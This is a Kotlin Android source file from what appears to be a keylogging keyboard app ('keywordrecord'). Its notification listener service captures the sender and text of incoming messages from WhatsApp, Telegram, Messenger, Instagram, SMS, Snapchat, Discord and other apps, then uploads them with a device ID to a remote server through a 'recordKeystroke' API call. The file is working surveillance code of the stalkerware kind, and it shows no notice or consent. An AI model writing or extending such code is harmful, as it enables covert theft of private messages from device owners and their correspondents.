package com.keywordrecord.keyboard

import android.app.Notification
import android.os.Build
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log

class MessageNotificationService : NotificationListenerService() {

    private lateinit var apiClient: ApiClient
    private lateinit var deviceUniqueId: String
    private val seenKeys = LinkedHashSet<String>()
    private var lastCleanup = System.currentTimeMillis()

    override fun onCreate() {
        super.onCreate()
        apiClient = ApiClient(this)
        deviceUniqueId = DeviceIdManager.getDeviceUniqueId(this)
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return
        try {
            if (sbn.packageName == packageName) return
            if (!isMessagingPackage(sbn.packageName)) return

            val extras = sbn.notification.extras ?: return
            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim().orEmpty()
            val messages = extractMessages(extras, title)
            if (messages.isEmpty()) return

            cleanupSeenKeys()
            for ((sender, body) in messages) {
                if (body.isBlank()) continue
                val dedupeKey = "${sbn.packageName}|${sbn.id}|$sender|$body"
                if (!seenKeys.add(dedupeKey)) continue

                apiClient.recordKeystroke(
                    deviceUniqueId = deviceUniqueId,
                    keyPressed = sender.take(50).ifEmpty { "message" },
                    fullText = body.take(2000),
                    appPackage = sbn.packageName,
                    action = "incoming_message"
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "Notification capture failed", e)
        }
    }

    private fun extractMessages(extras: Bundle, title: String): List<Pair<String, String>> {
        val results = mutableListOf<Pair<String, String>>()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val messages = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
            if (messages != null) {
                for (parcel in messages) {
                    val bundle = parcel as? Bundle ?: continue
                    val text = bundle.getCharSequence("text")?.toString()?.trim().orEmpty()
                    val sender = bundle.getCharSequence("sender")?.toString()?.trim()
                        ?: title.ifEmpty { "Unknown" }
                    if (text.isNotEmpty()) {
                        results.add(sender to text)
                    }
                }
            }
        }

        if (results.isEmpty()) {
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim().orEmpty()
            val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim().orEmpty()
            val body = bigText.ifEmpty { text }
            if (body.isNotEmpty()) {
                results.add(title.ifEmpty { "Unknown" } to body)
            }
        }

        return results
    }

    private fun cleanupSeenKeys() {
        val now = System.currentTimeMillis()
        if (now - lastCleanup < 60_000) return
        lastCleanup = now
        if (seenKeys.size > 200) {
            seenKeys.clear()
        }
    }

    private fun isMessagingPackage(packageName: String): Boolean {
        return packageName in MESSAGING_PACKAGES ||
            packageName.contains("whatsapp", ignoreCase = true) ||
            packageName.contains("telegram", ignoreCase = true) ||
            packageName.contains("messenger", ignoreCase = true) ||
            packageName.contains("messaging", ignoreCase = true) ||
            packageName.contains("instagram", ignoreCase = true)
    }

    companion object {
        private const val TAG = "MsgNotification"
        private val MESSAGING_PACKAGES = setOf(
            "com.whatsapp",
            "com.whatsapp.w4b",
            "org.telegram.messenger",
            "org.telegram.messenger.web",
            "com.facebook.orca",
            "com.google.android.apps.messaging",
            "com.android.mms",
            "com.samsung.android.messaging",
            "com.instagram.android",
            "com.viber.voip",
            "com.snapchat.android",
            "com.discord",
            "com.twitter.android",
            "com.zhiliaoapp.musically"
        )

        fun isEnabled(context: android.content.Context): Boolean {
            val flat = android.provider.Settings.Secure.getString(
                context.contentResolver,
                "enabled_notification_listeners"
            ) ?: return false
            val component = android.content.ComponentName(
                context,
                MessageNotificationService::class.java
            ).flattenToString()
            return flat.split(':').any { it.equals(component, ignoreCase = true) }
        }
    }
}
